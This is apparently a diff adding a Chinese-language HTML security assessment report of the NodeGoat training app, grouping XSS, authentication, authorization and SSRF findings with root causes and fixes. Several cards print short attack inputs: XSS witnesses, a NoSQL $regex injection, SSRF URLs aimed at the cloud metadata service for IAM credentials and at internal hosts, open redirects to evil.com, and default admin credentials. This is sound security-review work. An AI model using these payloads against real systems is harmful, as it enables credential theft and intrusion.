+      <div class="vuln__head"><span class="vid">XSS-VULN-10</span><span class="chip">Reflected</span><span class="meta">🔐 auth</span><span class="conf"><b>high</b></span></div>
+      <h3>profile 其余字段属性回显（多字段合并）</h3>
+      <dl class="kv"><dt>source</dt><dd><code>lastName/ssn/dob/bankAcc/bankRouting/address</code></dd><dt>sink</dt><dd>profile.html 多 <code>value=""</code></dd><dt>ctx</dt><dd>HTML_ATTRIBUTE</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>" onfocus="alert(1)   // 避免用 bankRouting（同时是 ReDoS sink）</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-11"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-11</span><span class="chip chip--warn">⚠ 编码误用</span><span class="chip">Stored</span><span class="meta">🔐 auth</span><span class="conf"><b>med</b></span></div>
+      <h3>website · ESAPI <code>encodeForHTML</code> 用错上下文</h3>
+      <dl class="kv"><dt>sink</dt><dd>profile.html:70 <code>value=""</code></dd><dt>encoding</dt><dd>body 编码用于属性 = 误用</dd><dt>fix</dt><dd>真正 URL sink 是 VULN-09</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>javascript:alert(1)   // encodeForHTML 不阻断 javascript:</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-12"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-12</span><span class="chip">Reflected</span><span class="meta">🔐 auth</span><span class="conf"><b>med</b></span></div>
+      <h3>error-template 经 <code>$where</code>/<code>eval</code> 错误回显</h3>
+      <dl class="kv"><dt>source</dt><dd><code>threshold</code> / <code>preTax</code> 等</dd><dt>sink</dt><dd>error-template.html:11 <code>{{error}}</code></dd><dt>side</dt><dd>信息泄露（err.name/查询结构）</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>GET /allocations/&lt;id&gt;?threshold=&lt;img src=x onerror=alert(1)&gt;</pre></details>
+    </div></article>
+    <article class="vuln" data-t="xss" id="xss-13"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">XSS-VULN-13</span><span class="chip">Reflected</span><span class="meta">🔐 auth</span><span class="meta">IDOR 同源</span><span class="conf"><b>low-med</b></span></div>
+      <h3>allocations userId · IDOR 源反射</h3>
+      <dl class="kv"><dt>source</dt><dd><code>req.params.userId</code>（URL path）</dd><dt>sink</dt><dd>allocations.html:15 <code>action=""</code></dd><dt>notes</dt><dd>触发交互性高，优先级低</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>" onfocus="alert(1)   // URL 编码后作 path 段</pre></details>
+    </div></article>
+  </div>
+
+  <!-- ============ AUTH ============ -->
+  <div class="h-sec" id="auth"><h2>认证分析报告</h2><span class="tag">10 findings · 8 High / 2 Medium</span></div>
+  <p class="sec-root"><b>根因：</b>会话生命周期失控（登录不轮换 session ID、cookie 缺 <code>Secure</code> 且无过期、明文 HTTP）；凭据策略全面失守（明文存储与 <code>===</code> 比较、硬编码默认凭据）；缺失 abuse 防御（无限流 / 差异化错误致用户枚举）。</p>
+  <div class="cards-label">全量 <span class="cnt">10 / 10</span></div>
+  <div class="vuln-grid">
+    <article class="vuln" data-t="auth" id="auth-01"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-01</span><span class="chip">Session Fixation</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>登录后不轮换 session ID</h3>
+      <dl class="kv"><dt>loc</dt><dd>session.js:116 <code>req.session.userId = ...</code></dd><dt>missing</dt><dd>未调 <code>req.session.regenerate()</code></dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>植入固定 ID → 诱导受害者登录 → 同 ID 接管（优先 admin）
+saveUninitialized:true 放大此面</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-02"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-02</span><span class="chip">Transport Exposure</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>明文 HTTP · 无 HTTPS / HSTS</h3>
+      <dl class="kv"><dt>loc</dt><dd>server.js:145 <code>http.createServer</code></dd><dt>missing</dt><dd>TLS / HSTS / no-store</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>网络路径攻击者被动抓包 → 凭据 + connect.sid 全得</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-03"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-03</span><span class="chip">Session Mgmt</span><span class="meta meta--pub">🌐 mixed</span><span class="conf"><b>High</b></span></div>
+      <h3>cookie 缺 Secure 且永不过期</h3>
+      <dl class="kv"><dt>loc</dt><dd>server.js:92-100 cookie 块注释</dd><dt>missing</dt><dd><code>Secure</code> / <code>maxAge</code></dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>窃得的 connect.sid 无限期有效 → 持久 token 重放</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-04"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-04</span><span class="chip">Abuse Missing</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>认证端点无速率限制/锁定/监控</h3>
+      <dl class="kv"><dt>loc</dt><dd>index.js:33-38 裸 handler</dd><dt>missing</dt><dd>rate-limit / 锁定 / 告警</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>无节制暴力破解 / 口令喷洒，叠加弱策略可靠接管</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-05"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-05</span><span class="chip">Enumeration</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>登录差异化错误致用户名枚举</h3>
+      <dl class="kv"><dt>loc</dt><dd>session.js:60-61 双消息</dd><dt>missing</dt><dd>统一错误消息</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>"Invalid username" vs "Invalid password" → 枚举 admin/user1</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-06"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-06</span><span class="chip">Weak Policy</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>弱口令策略 · 仅长度无复杂度</h3>
+      <dl class="kv"><dt>loc</dt><dd>session.js:144 <code>/^.{1,20}$/</code></dd><dt>missing</dt><dd>最小长度/复杂度/黑名单</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>注册 1 字符口令账户；字典/喷洒命中率极高</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-07"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-07</span><span class="chip">Plaintext Pwd</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>口令明文存储与 <code>===</code> 比较</h3>
+      <dl class="kv"><dt>loc</dt><dd>user-dao.js:25 存 / :60-61 比</dd><dt>missing</dt><dd>bcrypt 哈希 + 常量时间比较</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>/benefits 无投影返回全体明文口令 → 直接管 admin</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-08"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-08</span><span class="chip chip--star">★ 接管</span><span class="chip">Default Cred</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>High</b></span></div>
+      <h3>硬编码默认凭据 · 每次部署重灌</h3>
+      <dl class="kv"><dt>cred</dt><dd><code>admin / Admin_123</code></dd><dt>loc</dt><dd>db-reset.js:15-37 · compose 重灌</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>任意 NodeGoat 部署 → admin / Admin_123 直登管理员</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-09"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-09</span><span class="chip chip--warn">⚠ Medium</span><span class="chip">Secret Leak</span><span class="meta">mixed</span><span class="conf"><b>Medium</b></span></div>
+      <h3>公开 session 签名 secret</h3>
+      <dl class="kv"><dt>loc</dt><dd>config/env/all.js:8 占位串</dd><dt>impact</dt><dd>cookie 完整性破损（非任意伪造）</dd></dl>
+      <details class="poc"><summary>为何 Medium 而非 High</summary><pre>MemoryStore 下 cookie 仅签 SID；伪造 SID 须 store 命中
+→ 当前为完整性破损 + fixation 放大</pre></details>
+    </div></article>
+    <article class="vuln" data-t="auth" id="auth-10"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTH-VULN-10</span><span class="chip chip--warn">⚠ Medium</span><span class="chip">Auth Bypass</span><span class="meta meta--pub">🌐 pre-auth</span><span class="conf"><b>Medium</b></span></div>
+      <h3>userName 接受 NoSQL 操作符</h3>
+      <dl class="kv"><dt>loc</dt><dd>user-dao.js:91-93 无类型校验</dd><dt>impact</dt><dd>盲注枚举用户名</dd></dl>
+      <details class="poc"><summary>exploitation</summary><pre>{"userName":{"$regex":"^ad"},"password":"x"} → 据响应差异逐字符枚举
+经典双 $ne 一步登录不成立（password 走 JS ===，不入 DB 查询）</pre></details>
+    </div></article>
+  </div>
+
+  <!-- ============ AUTHZ ============ -->
+  <div class="h-sec" id="authz"><h2>授权分析报告</h2><span class="tag">7 findings · 裁决概览</span></div>
+  <p class="sec-root"><b>根因：</b><code>/allocations/:userId</code> 与 <code>POST /benefits</code> 的 <code>userId</code> 取自 params/body 而非 session；<code>isAdmin</code> 守卫"定义但从未挂载"；CSRF 全局禁用叠加 IDOR。下为裁决概览（原报告此章为表格形式，无逐条 trace）。</p>
+  <div class="cards-label">全量 <span class="cnt">7 / 7</span></div>
+  <div class="vuln-grid">
+    <article class="vuln" data-t="authz" id="authz-01"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-01</span><span class="chip chip--star">★ 首要</span><span class="chip">Horizontal</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3><code>GET /allocations/:userId</code> · IDOR</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>GET /allocations/:userId</code></dd><dt>defect</dt><dd><code>userId</code> 取自 <code>req.params</code></dd></dl>
+    </div></article>
+    <article class="vuln" data-t="authz" id="authz-02"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-02</span><span class="chip">Horizontal</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3><code>$where</code> 注入绕过 ownership filter</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>GET /allocations/:userId</code></dd><dt>defect</dt><dd>dump 全表 allocations</dd></dl>
+    </div></article>
+    <article class="vuln" data-t="authz" id="authz-03"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-03</span><span class="chip chip--star">★ 首要</span><span class="chip">Vertical</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3><code>isAdmin</code> 守卫 defined-but-unmounted</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>GET /benefits</code></dd><dt>defect</dt><dd>守卫定义于 index.js:58 从未挂载</dd></dl>
+    </div></article>
+    <article class="vuln" data-t="authz" id="authz-04"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-04</span><span class="chip">Horizontal</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>无 projection 返回全体非 admin 文档</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>GET /benefits</code></dd><dt>defect</dt><dd>PII + <code>_id</code> 枚举</dd></dl>
+    </div></article>
+    <article class="vuln" data-t="authz" id="authz-05"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-05</span><span class="chip">Vertical</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>同 VULN-03 根因 · 聚焦写操作</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>POST /benefits</code></dd><dt>defect</dt><dd><code>isAdmin</code> 未挂载</dd></dl>
+    </div></article>
+    <article class="vuln" data-t="authz" id="authz-06"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-06</span><span class="chip chip--star">★ 首要</span><span class="chip">Horizontal</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3><code>POST /benefits</code> · IDOR</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>POST /benefits</code></dd><dt>defect</dt><dd><code>userId</code> 取自 <code>req.body</code></dd></dl>
+    </div></article>
+    <article class="vuln" data-t="authz" id="authz-07"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">AUTHZ-VULN-07</span><span class="chip">CSRF + IDOR</span><span class="meta meta--pub">🌐 isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3>CSRF（csurf 整块注释）叠加 IDOR</h3>
+      <dl class="kv"><dt>endpoint</dt><dd><code>POST /benefits</code></dd><dt>defect</dt><dd>Context/Workflow · CSRF 全局禁用</dd></dl>
+    </div></article>
+  </div>
+
+  <!-- ============ SSRF ============ -->
+  <div class="h-sec" id="ssrf"><h2>SSRF 分析报告</h2><span class="tag">2 findings</span></div>
+  <p class="sec-root"><b>根因：</b><code>GET /research</code> 完整响应（非盲）SSRF——<code>req.query.url</code> 无校验拼接进 <code>needle.get()</code>，响应体原样回写，可打 IMDS / loopback / 内网；<code>GET /learn</code> 开放重定向。两者均仅需 <code>isLoggedIn</code>。</p>
+  <div class="cards-label">全量 <span class="cnt">2 / 2</span></div>
+  <div class="vuln-grid">
+    <article class="vuln" data-t="ssrf" id="ssrf-01"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">SSRF-VULN-01</span><span class="chip chip--star">★ CRITICAL</span><span class="chip">Full-Response SSRF</span><span class="meta meta--pub">🌐 公网</span><span class="meta">isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3><code>GET /research</code> 完整响应 SSRF</h3>
+      <dl class="kv"><dt>source</dt><dd><code>req.query.url + symbol</code></dd><dt>sink</dt><dd><code>needle.get(url)</code> @ research.js:16</dd><dt>leak</dt><dd><code>res.write(body)</code> 非盲回写</dd></dl>
+      <details class="poc"><summary>witness · 可利用目标矩阵</summary><pre>url=http://169.254.169.254&symbol=/latest/meta-data/iam/security-credentials/
+  → 泄露 IAM 凭据（IMDSv1 免 token）
+url=http://localhost:27017&symbol=/  → blind 端口扫描
+url=http://10.0.0.5&symbol=/          → 内网枚举</pre></details>
+    </div></article>
+    <article class="vuln" data-t="ssrf" id="ssrf-02"><div class="vuln__stripe"></div><div class="vuln__body">
+      <div class="vuln__head"><span class="vid">SSRF-VULN-02</span><span class="chip">Open Redirect</span><span class="meta meta--pub">🌐 公网</span><span class="meta">isLoggedIn</span><span class="conf"><b>high</b></span></div>
+      <h3><code>GET /learn</code> 开放重定向</h3>
+      <dl class="kv"><dt>source</dt><dd><code>req.query.url</code></dd><dt>sink</dt><dd><code>res.redirect(url)</code> @ index.js:72</dd><dt>scope</dt><dd>浏览器发起 · 非 SSRF</dd></dl>
+      <details class="poc"><summary>witness</summary><pre>GET /learn?url=//evil.com              → 302 evil.com
+GET /learn?url=https://evil.com/phish
+GET /learn?url=\\evil.com              → 绕过 startsWith('//') 检查</pre></details>
+    </div></article>
+  </div>
+
+</main>
+
+<script>
+function toggleTheme() {
+  const html = document.documentElement;
+  const next = html.dataset.theme === "dark" ? "light" : "dark";
+  html.dataset.theme = next;
+  document.querySelector(".theme-btn").textContent = "◐ theme: " + next;
+}
+</script>
+</body>
+</html>
